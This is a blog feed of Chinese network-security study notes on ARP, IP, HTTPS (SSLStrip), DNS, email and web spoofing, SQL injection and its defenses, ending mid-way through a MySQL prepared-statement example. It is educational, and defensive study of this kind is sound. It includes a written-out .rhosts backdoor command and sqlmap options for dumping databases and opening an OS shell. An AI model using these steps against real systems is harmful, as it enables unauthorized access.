        <content type="html"><![CDATA[<blockquote><p>复习笔记——欺骗攻击与防御</p></blockquote><a id="more"></a><h2 id="Arp欺骗"><a href="#Arp欺骗" class="headerlink" title="Arp欺骗"></a>Arp欺骗</h2><p>arp协议，地址解析协议，目的是实现IP地址到mac地址到转换。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/79fec308fd3e0867.png" alt="img"></p><p>PC1依据OSI模型①依次从上至下对数据进行封装，包括对ICMP Date加IP包头的封装，但是到了封装MAC地址的时候，②PC1首先查询自己的ARP缓存表，发现没有IP2和他的MAC地址的映射，这个时候MAC数据帧封装失败。我们使用ping命令的时候，是指定PC2的IP2的，计算机是知道目的主机的IP地址，能够完成网络层的数据封装，因为设备通信还需要对方的MAC地址，但是PC1的缓存表里没有，所以在MAC封装的时候填入不了目的MAC地址。</p><p>那么PC1为了获取PC2的MAC地址，③PC1要发送询问信息，询问PC2的MAC地址，询问信息包括PC1的IP和MAC地址、PC2的IP地址，这里我们想到一个问题，即使是询问信息，也是需要进行MAC数据帧的封装，那这个询问信息的目的MAC地址填什么呢，规定当目的MAC地址为ff-ff-ff-ff-ff-ff时，就代表这是一个询问信息，也即使后面我要说的广播。</p><p>PC2收到这个询问信息后，将这里面的IP1和MAC1（PC1的IP和MAC）添加到本地的ARP缓存表中，然后④PC2发送应答信息，对数据进行IP和MAC的封装，发送给PC1，因为缓存表里已经有PC1的IP和MAC的映射了呢。这个应答信息包含PC2的IP2和MAC2。PC1收到这个应答信息，理所应当的就获取了PC2的MAC地址，并添加到自己的缓存表中。</p><p>经过这样交互式的一问一答，PC1和PC2都获得了对方的MAC地址，值得注意的是，目的主机先完成ARP缓存，然后才是源主机完成ARP缓存。之后PC1和PC2就可以真正交流了。</p><p><strong>ARP之广播请求单播回应</strong></p><p>上图面的图解是不完全的ARP协议，因为在局域网里边不会只有两台主机，这里就要考虑如何在局域网众多主机里获得目的主机的MAC。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/682cfc5af8c5f828.png" alt="img"></p><p>和上面的一样，刚开始PC1并不知道PC2的MAC地址，同样需要发送ARP请求，但是这个局域网里主机很多，怎么唯独获取PC2的MAC呢，①我们想到和一群陌生人交流一样，可以挨着询问一遍，这就是我们要说的广播，首先PC1广播发送询问信息（信息和上一张图介绍的一样），在这个普通交换机上连接的设备都会受到这个PC1发送的询问信息。</p><p>接下来②需要做的是，所有在这个交换机上的设备需要判断此询问信息，如果各自的IP和要询问的IP不一致，则丢弃，如图PC3、Route均丢弃该询问信息，而对于PC2判断该询问信息发现满足一致的要求，则接受，同样的写入PC1的IP和MAC到自己的ARP映射表中。</p><p>最后，③PC2单播发送应答信息给PC1，告诉PC1自己的IP和MAC地址。</p><hr><p><strong>二、ARP数据包信息</strong></p><p>ARP数据的详细信息列表如下</p><p><a href="https://www.notion.so/e4e923b5181a4a6699d3eae61e461320" target="_blank" rel="noopener">arp</a></p><p><strong>ARP请求包</strong></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/ab0b5131da0b7a71.png" alt="img"></p><p><strong>ARP应答包</strong></p><p>内容格式和上图相似，不过会有目的地址对应的MAC地址，ARP数据包类型字段为2。</p><hr><p><strong>三、ARP攻击</strong></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/05089dfbfedbb0d9.png" alt="img"></p><p>我们知道，当PC1对PC2正常通信的时候（先别管攻击者PC3），PC2、PC1会先后建立对方的IP和MAC地址的映射（即建立ARP缓存表），同时对于交换机而言，它也具有记忆功能，会基于源MAC地址建立一个CAM缓存表（记录MAC对应接口的信息），理解为当PC1发送消息至交换机的Port1时，交换机会把源MAC（也就是MAC1）记录下来，添加一条MAC1和Port1的映射，之后交换机可以根据MAC帧的目的MAC进行端口转发，这个时候PC3只是处于监听状态，会把PC1的广播丢弃。</p><p>正常的PC3会把广播包丢弃，同样的PC3可以抓住这一环节的漏洞，把不属于自己的广播包接收，同时回应一个虚假的回应包，告诉PC1我就是PC2</p><p>（IP2-MAC3），这样PC1会收到两个回应包（一个正确的IP2-MAC2，一个虚假的IP2-MAC3），但是PC1并不知道到底哪个是真的，所以PC1会做出判断，并且判断后到达的为真，那么怎么让虚假的回应包后到达呢，PC3可以连续不断的发送这样的回应包，总会把哪个正确的回应包覆盖掉。</p><p>而后PC1会建立IP2-MAC3这样一条ARP缓存条目，以后当PC1给PC2发送信息的时候，PC1依据OSI模型从上至下在网络层给数据封装目的IP为IP2的包头，在链路层通过查询ARP缓存表封装目的MAC为MAC3的数据帧，送至交换机，根据查询CAM表，发现MAC3对应的接口为Port3，就这样把信息交付到了PC3，完成了一次ARP攻击。</p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/4b81c221e095f204.png" alt="img"></p><p>如果ARP攻击严重话，会导致同一个局域网（也是同一个广播域）的所有主机的ARP缓存表中都存放着错误的IP和MAC的映射，如上图，每台主机的ARP缓存表中，不论哪个IP，都会映射到攻击者的MAC地址MAC1上，这样该局域网内的所有主机的消息都发送到Hacker的主机上。</p><p>常用攻击工具：ettercap</p><p>防御：arp防火墙，静态arp</p><h2 id="Ip欺骗"><a href="#Ip欺骗" class="headerlink" title="Ip欺骗"></a>Ip欺骗</h2><p>IP欺骗是在服务器不存在任何漏洞的情况下，通过利用TCP/IP协议本身存在的一些缺陷进行攻击的方法，这种方法具有一定的难度，需要掌握有关协议的工作原理和具体的实现方法。</p><p>IP地址欺骗是指行动产生的IP数据包为伪造的源IP地址，以便冒充其他系统或发件人的身分。</p><p><strong>一、TCP、IP协议的简单说明：</strong></p><p>  TCP/IP（传输控制协议/网际协议）是一种网络通信协议，它规范了网络上的所有通信设备，尤其是一个主机与另一个主机之间的数据传输格式以及传送方式，TCP/IP是因特网的基础协议。要想当黑客就有必要了解TCP/IP协议。</p><p>  在数据传送中，可以形象的理解为有两个信封：TCP和IP信封。要送递的信息被分成若干段，每一段塞入一个TCP信封，并在该信封上记录有分段号的信息，再将TCP信封塞入IP大信封里，发送到网上。在扫收端，一个TCP软件包收集信封，抽出数据，按发送方的顺序还原，并加以校验，若发现差错，TCP将会要求重发。因此TCP/IP在因特网中几乎可以无差错地传送数据。对因特网用户来说，并不需要了解网络协议的整个结构，仅需了解IP的地址格式，即可与世界各地进行网络通信。</p><p> <strong>1、TCP/IP的层次结构：</strong></p><p>  TCP/IP协议组中的协议因特网上数据的传输，提供了几乎目前上网所用到的所有服务，在TCP/IP协议组中有两种协议：</p><p>  （1）网络层协议：</p><p>  网络层协议管理离散计算机间的数据传输。这些协议用户注意不到，它们是个系统表层以下工作的。比如，IP协议为用户和远程计算机提供了信息包的传输方法，它是在许多信息的基础上工作的。比如机器的IP地址。在机器的IP地址和其他信息的基础上，IP确保信息包正确达到目的机器。通过这一过程，IP和其他网络层的协议一共同用于数据传输。如果没有网络工具，用户就看不到在系统里工作的机器的IP。</p><p>  （2）应用层协议：</p><p>  相反地，应用层协议是可以看到的。比如，文件传输协议（FTP)是可以看到的。用户为了传一个文件而请求一个和其他计算机连接，连接建立后，就开始传输文件，在传输时，用户和远程计算机的交换的一部分是能看到的。</p><p><strong>2、TCP/IP的重要协议：</strong></p><p>  （1）地址解析协议（ARP)：</p><p>  在网络上进行通信的主机必须知道对方主机的硬件地址（网卡的物理地址）。地址解析协议的目的就是将IP地址映射成物理地址。这在使信息通过网络时特别重要。一个消息（或者其他数据）在发送之前，被打包到IP包里面，或适合于因特网传输信息块中，其中包括两台计算机的IP地址。 在这个包离开发送计算机前，必须找到目标的硬件地址，这就是ARP最初到达的地方。</p><p>  一个ARP请求消息会在网上广播。请求由一个进程接收，它回复物理地址。这个回复消息由原先的那台发送广播消息的计算机接收，从而传输过程就开始了。</p><p>  ARP的设计包括一个缓存。为了减少广播量，ARP在缓存中保存地址映射以备后用。ARP级存保存有动态项和静态项。动态项是自动加和删除的，静态项则是保留在缓存(Cache)中，直到计算机重启为止。ARP缓存总是为本地子网保留硬件广播地址(0xffffffffffffh)用为一个永久项，此项使主机能够接收ARP广播。当果看存时，该项不会显示。每条ARP缓存记录的生命周期为10分种，如果2分种未用则删除。缓存容量满时，删除最早的记录，但是，缓存也引起了安全性的问题。那就是缓存溢出——这不是本文的讨论内容，所以就不说了。</p><p>  （2）因特网控制消息协议（ICMP）：</p><p>  因特网控制消息协议（ICMP)用于报告错误并IP对消息进行控制。IP运用互联组管理协议(IGMP)来告诉路由器某一网络上指导组中有哪些可用主机。</p><p>  以ICMP实现的最著名的网络工具是Ping。Ping通常用来判断一台远程机器是否正开着，数据包从用户的计算机发到远程计算机，这些包通常返回到用户的计算机，如果数据据包没有返回到用户计算机，Ping程序就产生一个表示远程计算机关机的错误消息。</p><p>二<strong>、IP欺骗的理论根据：</strong></p><p>  由于TCP是面向连接的协议，所以在双方正式传输数据之前，需要用“三次握手”来建立一个稳重的连接。</p><p>这里的ip欺骗是tcp会话劫持</p><p>假设hosta和hostb两台主机进行通信，hostb首先发送带有SYN标志的数据段通知hosta建立TCP连接，TCP的可靠性就是由数据包中的多位控制字来提供的，其中最重要的是数据序列SYN和数据确认标志ACK。B将TCP报头中的SYN设为自己本次连接中的初始值（ISN）。</p><p>  当hosta收到hostb的SYN包之后，会发送给hostb一个带有SYN+ACK标志的数据段，告之自己的ISN，并确认hostb发送来的第一个数据段，将ACK设置成hostb的SYN+1。</p><p>  当hostb确认收到hosta的SYN+ACK数据包后，将ACK设置成hosta的SYN+1。Hosta收到hostb的ACK后，连接成功建立，双方可以正式传输数据了。</p><p>  看了这个过程，我们就很容易想到，假如想冒充hostb对hosta进行攻击，就要先使用hostb的IP地址发送SYN标志给hosta，但是当hosta收到后，并不会把SYN+ACK发送到我们的主机上，而是发送到真正的hostb上去，这时IP欺骗就失败了，因为hostb根本没发送发SYN等。所以如果要冒充hostb，首先要让hostb失去工作能力，也就是所谓的拒绝服务攻击，设法让让hostb瘫痪。</p><p>  可是这样还是远远不够的，最难的就是要对hosta进行攻击，必须知道hosta使用的ISN。TCP使用的ISN是一个32位的计数器，从0到4,294,967,295。TCP为每一个连接选择一个初始序列号ISN，为了防止因为延迟、重传等扰乱三次握手，ISN不能随便选取，不同的系统有着不同的算法。理解TCP如何分配ISN以及ISN随时间的变化规律，对于成功的进行IP欺骗攻击是很重要的！ISN约每秒增加128 000，如果有连接出现，每次连接将把计数器的数值增加64,000。很显然，这使得用于表示ISN的32位计数器在没有连接的情况下每9.32小时复位一次。这所以这样，是因为它有利于最大于度地减少“旧有”连接的信息干扰当前连接的机会。如果初始序例号是随意选择的，那么不能保证现有序例号是不同于先前的。假设有这样一种情况，在一个路由回路中的数据包最终跳出循环，回到了“旧有”的连接，显然这会对现有连接产生干扰。预测出攻击目标的序例号非常困难，而且各个系统也不想同，在Berkeley系统，最初的序列号变量由一个常数每秒加1产生，等加到这个常数的一半时，就开始一次连接。这样，如果开始一个合法连接，并观察到一个ISN正在使用，便可以进行预测，而且这样做有很高的可信度。现在我们假设黑客已经使用某种方法，能预测出ISN。在这种情况下，他就可以将ACK序便号送给hosta，这时连接就建立了。</p><p>三、<strong>IP欺骗攻击过程解析：</strong></p><p>  IP欺骗由若干步骤组成，下面是它的详细步骤：</p><p>  1、使被信任主机失去工作能力：</p><p>  为了伪装成被信任主机而不露陷，需要使其完全失去工作能力。由于攻击者将要代替真正的被信任主机，他必须确保真正的被信任主机不能收到任何有效的网络数据，否则将会被揭穿。有许多方法可以达到这个目的（如SYN洪水攻击、TTN、Land等攻击）。现假设你已经使用某种方法使得被信任的主机完全失去了工作能力。</p><p>  2、序例号取样和猜测：</p><p>  前面讲到了，对目标主机进行攻击，必须知道目标主机的数据包序例号。通常如何进行预测呢？往往先与被攻击主机的一个端口（如：25）建立起正常连接。通常，这个过程被重复N次，并将目标主机最后所发送的ISN存储起来。然后还需要进行估计他的主机与被信任主机之间的往返时间，这个时间是通过多次统计平均计算出来的。往返连接增加64,000.现在就可以估计出ISN的大小是128,000乘以往返时间的一半，如果此时目标主机刚刚建立过一个连接，那么再加上64 ,00。</p><p>  一旦估计出ISN的大小，就开始着手进行攻击，当然你的虚假TCP数据包进入目标主机时，如果刚才估计的序例号是准确的，进入的数据将被放置在目标机的缓冲区中。但是在实际攻击过程中往往没这么幸运，如果估计序例号的小于正确值，那么将被放弃。而如果估计的序例号大于正确值，并且在缓冲区的大小之内，那么该数据被认为是一个未来的数据，TCP模块将等待其他缺少的数据。如果估计序例号大于期待的数字且不在缓冲区之内，TCP将会放弃它并返回一个期望获得的数据序例号。</p><p>  你伪装成被信任的主机IP，此时该主机仍然处在瘫痪状态，然后向目标主机的513端口（rlogin）发送连接请求。目标主机立刻对连接请求作出反应，发更新SYN+ACK确认包给被信任主机，因为此时被信任主机仍然处于瘫痪状态，它当然无法收到这个包，紧接关攻击者向目标主机发送ACK数据包，该包使用前面估计的序例号加1。如果攻击者估计正确的话，目标主机将会接收该ACK。连接就正式建立起了，可以开始数据传输了。这时就可以将cat ‘++’&gt;&gt;~/.rhosts命令发送过去，这样完成本次攻击后就可以不用口令直接登录到目标主机上了。如果达到这一步，一次完整的IP欺骗就算完成了，黑客已经在目标机上得到了一个Shell权限，接下来就是利用系统的溢出或错误配置扩大权限，当然黑客的最终目的还是获得服务器的root权限。</p><p>  3、总结一下IP攻击的整个步骤：</p><p>  （1）首先使被信任主机的网络暂时瘫痪，以免对攻击造成***扰；</p><p>  （2）然后连接到目标机的某个端口来猜测ISN基值和增加规律；</p><p>  （3）接下来把源址址伪装成被信任主机，发送带有SYN标志的数据段请求连接；</p><p>  （4）然后等待目标机发送SYN+ACK包给已经瘫痪的主机；</p><p>  （5）最后再次伪装成被信任主机向目标机发送的ACK，此时发送的数据段带有预测的目标机的ISN+1；</p><p>  （6）连接建立，发送命令请求。 (连接是建立了,但是只能发送命令，收不到回显，因为服务器根据IP回显给了真的信任主机)</p><p><strong>IP欺骗的防御</strong></p><ol><li>抛弃基于地址的信任策略，不允许r*类远程调用命令执行</li><li>进行包过滤，入口过滤和出口过滤</li><li>使用加密技术，网络层采用IPSec，传输层采用tls协议。</li><li>使用随机化的初始序列号。</li></ol><p><strong>基于sslstrip的https会话劫持</strong></p><p>0 引言</p><p>HTTPS作为一种安全的HTTP数据传输协议，被广泛应用于万维网上敏感信息的通信，例如交易支付等方面。然而，HTTPS也存在自身的缺陷，不能绝对保证服务端自身的安全。在网络攻防中，威胁服务器安全的行为时有发生，最常见的例子就是使用模仿银行域名的钓鱼攻击(Phishing)。随着HTTPS的广泛使用，一些新的针对HTTPS会话的劫持也开始出现，如基于中间人攻击的Surf Jacking、SSLSniff等。</p><p>文中结合HTTPS实现过程中出现的一些问题，分析了一种新的HTTPS会话劫持方法SSLStrip，同时提出了针对HTTPS会话劫持的防范措施。</p><p>1 HTTPS协议分析</p><p>HTTPS(Hyper Text Transfer Protocol over Secure Socket Layer)，是以安全为目标的HTTP通道。它是由Netscape公司开发，其目的是通过应用Netscape的安全套接字层(SSL)作为HTTP应用层的子层，实现对数据的加密以及身份的验证。当客户端向服务器提出连接要求时，首先要协商建立SSL连接，然后在SSL应用数据通道上传输HTTP数据。HTTPS使用端口443进行通信，而不同于HTTP使用端口80与TCP/IP进行通信[1]。</p><p>当HTTPS服务器与客户端进行交互时，其连接过程可以分为3个阶段：客户端与服务器之间建立TCP连接；客户端与服务器进行SSL握手；在客户端与服务器成功SSL握手后，传送已加密的HTTPS数据。</p><p>其中，完整的SSL握手过程又可分成以下4个步骤[2]：</p><p>① 建立安全能力：确定客户端浏览器与HTTPS服务器之间通信所使用的SSL版本和密码编码方式。</p><p>② 服务器鉴别和密钥交换：HTTPS服务器向客户端发送数字证书，以证明自己的身份，此证书中包含服务器公钥及其他信息，并使用CA密钥加密。</p><p>③ 客户端验证和密钥交换：客户端验证HTTPS服务器身份，并生成会话密钥，使用服务器公钥加密。如服务器需验证客户端，则向服务器发送客户端证书，并使用客户端自己的私钥加密。</p><p>④ 握手完成：服务器与客户端确认会话密钥，并发送单独加密报文，表示握手完成。</p><p>在HTTPS的使用中，一些服务器也会采用SSL简单握手协议，在SSL握手过程中，服务器不需要客户端提供证书，其结果可导致欺骗的发生。</p><p>2 HTTPS会话劫持</p><p>2.1 HTTPS中间人攻击</p><p>HTTPS中间人攻击(Man-in-the-Middle Attack)[3]是一种“间接”的入侵攻击，这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机MITM虚拟放置在网络连接中的客户端Client与服务器Server之间，在客户端与服务器进行HTTPS通信时，由MITM对HTTPS数据进行转发，Client和Server都不会意识到会话已被劫持。MITM不仅可窃听HTTPS通信还可以对信息进行篡改，达到HTTPS攻击的目的。</p><p>基于Web的HTTPS会话使用SSL协议，而SSL协议在握手协商阶段发送公钥证书。比较普遍的HTTPS中间人攻击，例如SSLSniff等，在网关截获SSL会话，替换服务器公钥证书，将公钥PKey换成自己的公钥PKey’，欺骗客户端。客户端使用PKey’加密信息并发送会话，中间人用私钥Skey’解密客户端返回会话，从而劫持会话。同时，中间人用PKey加密明文会话并返回服务器[4]。</p><p>使用SSLSniff进行HTTPS会话劫持时，在客户端收到未认证的证书时，浏览器会弹框示警，从而有可能造成客户端对MITM存在的警觉。</p><p>2.2 HTTPS会话劫持的新方法 SSLStrip</p><p>(1) SSLStrip简介</p><p>在分析完HTTPS协议流程以及一种HTTPS中间人方法SSLSniff后，文中介绍一种新的HTTPS中间人会话劫持方法SSLStrip[5]。SSLStrip所能达成的目标是在客户端与服务器建立连接时，在MITM与Server之间形成HTTPS连接，而在Client与MITM之间形成HTTP连接，即将SSL层从原HTTPS连接中“剥离”。这样，既避免了在客户端验证证书时难以避免的弹框问题，又能够劫持HTTP明文数据，并同时保证客户端HTTP数据的传输，达到欺骗服务器与客户端的效果。</p><p>(2) SSLStrip的原理和实现</p><p>现实生活中，在浏览器地址栏中输入网址时，多数用户会采用直接输入网址的方式，而忽略了传输所采用的协议。例如，在登录gmail过程中，大多数用户会直接在地址栏中输入<code>www.gmail.com</code>，向Google服务器发送一个HTTP连接请求，而不是输入<code>https://www.gmail.com</code>，向服务器发送一个HTTPS连接请求。因此，用户通常接触到HTTPS的方式有两种：一种是 Web上的连接，比如当用户在gmail上输入用户名和密码后，点击的登录键，将用户的用户名和密码以HTTPS的形式POST到服务器。另一种是通过HTTP的302状态。当客户端向gmail提出HTTP连接请求时，gmail服务器会返回一个REDIRECT网址，<code>https://www.google.com/accounts/ServiceLogin?service=mail...</code>，用户端在接收到这个URL后，将页面重定位到该网页，并请求HTTPS连接。</p><p>从另外一个角度讲，用户通常是通过HTTP向服务器发起HTTPS连接的。而HTTP本身是以明文的形式对外传送，并不能保证数据的安全。因此，可以考虑通过对HTTP进行劫持，来实现对HTTPS劫持的目的。整个SSLStrip过程包括如下几个步骤(见图1)：</p><p>① 客户端Client向服务器Server发起HTTP连接请求；</p><p>② 中间人MITM监听客户端与服务器的HTTP数据；</p><p>③ 服务器返回给客户端的HTTP数据包被在客户端与服务器之间的中间人截获。中间人解析原HTTP数据包，将其中<code>&lt;a href=&quot;https：//...&quot;&gt;</code>替换成<code>&lt;a href=&quot;http：//...&quot;&gt;</code>，将<code>Location:https://..</code>. 替换成<code>Location:http://..</code>，同时记录下所修改的URL，并保存；</p><p>④ 中间人将修改后的HTTP数据发送给客户端；</p><p>⑤ 客户端Client向服务器Server发起HTTP连接请求；</p><p>⑥ 中间人计算机解析客户端的HTTP连接请求，并与保存文件相比较。当发现存在有已修改过的HTTP URL时，将其替换成原HTTPS URL，并发送给服务器；</p><p>⑦ 与服务器保持HTTPS连接，回到步骤③；</p><p>⑧ 与客户端保持HTTP连接，回到步骤④。</p><p>SSLStrip原理流程如图2所示。</p><p>(3) SSLStrip劫持HTTPS的效果</p><p>对于服务器端而言，服务器Server从HTTPS连接开始，就与中间人MITM建立SSL连接。服务器并不能区分客户端Client和中间人MITM的区别，因而，服务器认为HTTPS是安全的。</p><p>对于客户端而言，由于中间人MITM与客户端Client之间是HTTP连接，因此并不会产生证书认证时弹框等任何示警。如图3所示，在Firefox浏览器下，SSLStrip前后的明显区别是：URL前的图标不同；URL中的https：//被替换成http：//。作为一般用户，不会注意到这些区别，而浏览器也会误认为其与服务器之间的http连接是安全的。</p><p>对于中间人而言，他们可以劫持并监听服务器与客户端之间的任何HTTP与HTTPS通信。</p><p>3 针对SSLStrip的防御</p><p>SSLStrip在SSL连接开始之前，就对客户端进行欺骗，同时与服务器进行HTTPS交互。针对SSLStrip的防御可以从两个方面开始进行：</p><p>(1)针对服务器</p><p>在整个域名下，建议都使用基于SSL的HTTPS连接，不要在已经不属于SSL的对话页面上提供注册服务，以防止中间人以HTTP中间人的方式劫持HTTPS。</p><p>(2)针对客户端[6]</p><p>针对客户端的防御有以下步骤：</p><p>① 在输入涉密网站的网址时，尽量加上“https://”，以防止中间人篡改HTTP重定向后的URL；</p><p>② 对于使用IE作为浏览器的用户，在登录涉密网站时，若地址栏没有变成黄色时加以注意；对于使用其他浏览器的用户，在登录涉密网站时，注意是否显示为https://…，均可在一定程度上防范当前的中间人和网络钓鱼攻击；</p><p>③ 下载最新版高安全度的网络浏览器；</p><p>④ 对敏感账号采用认证证书，如令牌和其他形式的双因素认证；</p><p>⑤ 对来自未知发件人发出的电子邮件要高度警惕，不要以点击链接的方式接入涉密网站(而应在浏览器中输入网址)。</p><p>另外，由于SSLStrip是基于中间人攻击的，因此一些针对ARP欺骗的防御方式[7]同样可有效地用于SSLStrip的防御，比如，使用非对称加密等方式，或者使用一些带有IP过滤的以太网交换机等等。</p><h2 id="dns欺骗"><a href="#dns欺骗" class="headerlink" title="dns欺骗"></a>dns欺骗</h2><h3 id="1、DNS"><a href="#1、DNS" class="headerlink" title="1、DNS"></a><strong>1、DNS</strong></h3><blockquote><p>DNS即Domain Name System 的缩写，域名系统以分布式数据库的形式将域名和IP地址相互映射。DNS协议即域名解析协议，简单的说：DNS是用来将域名解析成对应ip地址的协议。</p></blockquote><h3 id="2、工作原理"><a href="#2、工作原理" class="headerlink" title="2、工作原理"></a><strong>2、工作原理</strong></h3><ol><li>访问<code>www.baidu.com</code> ，首先要向本地DNS服务器发出DNS请求，查询 <code>www.baidu.com</code> 的IP地址，如果本地DNS服务器没有在自己的DNS缓存表中发现该网址的记录，就会向根服务器发起查询，根服务器收到请求后，将com域服务器的地址返回给本地DNS服务器，本地DNS服务器则继续向com域发出查询请求，域服务器将 baidu.com 授权域名服务器的地址返回给本地DNS服务器，本地DNS服务器继续向 baidu.com 发起查询，得到<code>www.baidu.com</code>的IP地址。</li><li>本地DNS服务器得到<code>www.baidu.com</code>对应的IP地址后以dns应答包的方式传递给用户，并且在本地建立DNS缓存表。</li><li>Windows下查看和刷清空DNS缓存表的命令</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /displaydns    </span><br><span class="line">ipconfig /flushdns1</span><br></pre></td></tr></table></figure><h3 id="3、DNS欺骗"><a href="#3、DNS欺骗" class="headerlink" title="3、DNS欺骗"></a><strong>3、DNS欺骗</strong></h3><blockquote><p>首先欺骗者向目标机器发送构造好的ARP应答数据包，ARP欺骗成功后，嗅探到对方发出的DNS请求数据包，分析数据包取得ID和端口号后，向目标发送自己构造好的一个DNS返回包，对方收到DNS应答包后，发现ID和端口号全部正确，即把返回数据包中的域名和对应的IP地址保存进DNS缓存表中，而后来的当真实的DNS应答包返回时则被丢弃。</p></blockquote><ul><li><p>参考：</p><p><a href="https://blog.csdn.net/xg_ren/article/details/79154965" target="_blank" rel="noopener">https://blog.csdn.net/xg_ren/article/details/79154965</a></p></li></ul><h2 id="电子邮件欺骗"><a href="#电子邮件欺骗" class="headerlink" title="电子邮件欺骗"></a>电子邮件欺骗</h2><p>主要是伪造发送地址，回复地址，和钓鱼链接，附件等。</p><p>防御手段：</p><ol><li>用户需要有良好的防范意识</li><li>smtp服务器需要开启身份验证机制。</li><li>对邮件进行加密和签名。</li></ol><h2 id="web欺骗"><a href="#web欺骗" class="headerlink" title="web欺骗"></a>web欺骗</h2><p>伪造一模一样网站进行钓鱼，仔细分别可以区分开。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全复习笔记—web攻击与防御</title>
      <link href="/2020/11/27/webgongjifangyu/"/>
      <url>/2020/11/27/webgongjifangyu/</url>
      
        <content type="html"><![CDATA[<blockquote><p>复习笔记——web攻击与防御</p></blockquote><a id="more"></a><h2 id="sql注入攻击"><a href="#sql注入攻击" class="headerlink" title="sql注入攻击"></a>sql注入攻击</h2><ul><li><p>参考</p><p><a href="https://www.jianshu.com/p/078df7a35671" target="_blank" rel="noopener">https://www.jianshu.com/p/078df7a35671</a></p></li></ul><p>sql注入的原理是因为用户输入的数据被作为sql命令解释执行了。</p><p><a href="https://www.notion.so/d8a8a6da358e4cf8a1fb9b839946033d" target="_blank" rel="noopener">sql注入的分类</a></p><p>手工注入费时间，所以最好用工具注入，比如sqlmap、havij、pangolin。</p><h2 id="sqlmap简单介绍"><a href="#sqlmap简单介绍" class="headerlink" title="sqlmap简单介绍"></a>sqlmap简单介绍</h2><ul><li>-u 指定URL信息</li><li>—cookie 指定cookie值</li><li>—dbs 获取数据库信息</li><li>—current-db 列出当前应用使用的数据库</li><li>-D 指定数据库</li><li>—table 获取数据库表的信息 一般结合-D参数使用</li><li>-T 指定数据库的表</li><li>—columns 获取表字段名称，一般结合-T参数使用</li><li>-C 指定数据库的表的列</li><li>—dump 转存数据库数据，一般结合-D，-T，-C，使用。</li><li>—privileges 测试用户权限，例如 —privileges -U root 测试 root 用户权限</li><li>—os-cmd=“net user” 执行cmd指令，这里是执行net user 命令</li><li>—os-shell 获取与系统交互的shell</li></ul><h2 id="sql注入的防御"><a href="#sql注入的防御" class="headerlink" title="sql注入的防御"></a>sql注入的防御</h2><p>注意：但凡有SQL注入漏洞的程序，都是因为程序要接受来自客户端用户输入的变量或URL传递的参数，并且这个变量或参数是组成SQL语句的一部分，对于用户输入的内容或传递的参数，我们应该要时刻保持警惕，这是安全领域里的「外部数据不可信任」的原则，纵观Web安全领域的各种攻击方式，大多数都是因为开发者违反了这个原则而导致的，所以自然能想到的，就是从变量的检测、过滤、验证下手，确保变量是开发者所预想的。</p><p><strong>1、检查变量数据类型和格式</strong></p><p>如果你的SQL语句是类似where id={$id}这种形式，数据库里所有的id都是数字，那么就应该在SQL被执行前，检查确保变量id是int类型；如果是接受邮箱，那就应该检查并严格确保变量一定是邮箱的格式，其他的类型比如日期、时间等也是一个道理。总结起来：只要是有固定格式的变量，在SQL语句执行前，应该严格按照固定格式去检查，确保变量是我们预想的格式，这样很大程度上可以避免SQL注入攻击。　比如，我们前面接受username参数例子中，我们的产品设计应该是在用户注册的一开始，就有一个用户名的规则，比如5-20个字符，只能由大小写字母、数字以及一些安全的符号组成，不包含特殊字符。此时我们应该有一个check_username的函数来进行统一的检查。不过，仍然有很多例外情况并不能应用到这一准则，比如文章发布系统，评论系统等必须要允许用户提交任意字符串的场景，这就需要采用过滤等其他方案了。</p><p><strong>2、过滤特殊符号</strong></p><p>对于无法确定固定格式的变量，一定要进行特殊符号过滤或转义处理。</p><p><strong>3、绑定变量，使用预编译语句</strong>　</p><p>MySQL的mysqli驱动提供了预编译语句的支持，不同的程序语言，都分别有使用预编译语句的方法</p><p>实际上，绑定变量使用预编译语句是预防SQL注入的最佳方式，使用预编译的SQL语句语义不会发生改变，在SQL语句中，变量用问号?表示，黑客即使本事再大，也无法改变SQL语句的结构</p><hr><p><strong>什么是sql预编译</strong></p><p>1.1：预编译语句是什么</p><p>通常我们的一条sql在db接收到最终执行完毕返回可以分为下面三个过程：</p><ol><li>词法和语义解析　优化sql语句，制定执行计划　执行并返回结果</li></ol><p>我们把这种普通语句称作Immediate Statements。</p><p>但是很多情况，我们的一条sql语句可能会反复执行，或者每次执行的时候只有个别的值不同（比如query的where子句值不同，update的set子句值不同,insert的values值不同）。　如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。</p><p>所谓预编译语句就是将这类语句中的值用占位符替代，可以视为将sql语句模板化或者说参数化，一般称这类语句叫Prepared Statements或者Parameterized Statements　预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止sql注入。　当然就优化来说，很多时候最优的执行计划不是光靠知道sql语句的模板就能决定了，往往就是需要通过具体值来预估出成本代价。</p><p>1.2：MySQL的预编译功能</p><p><strong>注意MySQL的老版本（4.1之前）是不支持服务端预编译的，但基于目前业界生产环境普遍情况，基本可以认为MySQL支持服务端预编译。</strong></p><p>下面我们来看一下MySQL中预编译语句的使用。　（1）建表 首先我们有一张测试表t，结构如下所示：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show create table t\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">       Table: t</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">Table</span>: <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`t`</span> (</span><br><span class="line">  <span class="string">`a`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`b`</span> <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="keyword">UNIQUE</span> <span 